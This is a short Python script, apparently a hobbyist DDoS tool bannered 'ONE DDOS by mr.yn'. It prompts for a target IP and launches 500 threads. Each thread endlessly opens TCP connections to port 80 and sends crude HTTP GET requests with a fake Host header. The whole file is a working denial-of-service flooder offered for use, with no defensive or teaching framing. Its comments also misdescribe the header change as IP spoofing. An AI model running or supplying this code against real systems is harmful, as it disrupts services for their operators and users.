#imports
import os,time,socket,threading
from colorama import Fore
#print baner
def baner():
    print("""
    
 ▒█████   ███▄    █ ▓█████    ▓█████▄ ▓█████▄  ▒█████    ██████ 
▒██▒  ██▒ ██ ▀█   █ ▓█   ▀    ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒██░  ██▒▓██  ▀█ ██▒▒███      ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
▒██   ██░▓██▒  ▐▌██▒▒▓█  ▄    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░ ████▓▒░▒██░   ▓██░░▒████▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░░ ▒░ ░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
  ░ ▒ ▒░ ░ ░░   ░ ▒░ ░ ░  ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
░ ░ ░ ▒     ░   ░ ░    ░       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
    ░ ░           ░    ░  ░      ░       ░        ░ ░        ░  by mr.yn
                               ░       ░                        

    """)
baner()
target = input("enter target ip => ")
port = 80
fake_ip = "183.50.32.20"
    #fake ip
#start attack
def attack():
    con =  1
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target,port))
        s.sendto(("Host: " + fake_ip + '\r\n\r\n').encode('ascii'), (target,port))
        s.close()
        print(con)
        con += 1
    #send 500 req in 1s
for x in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
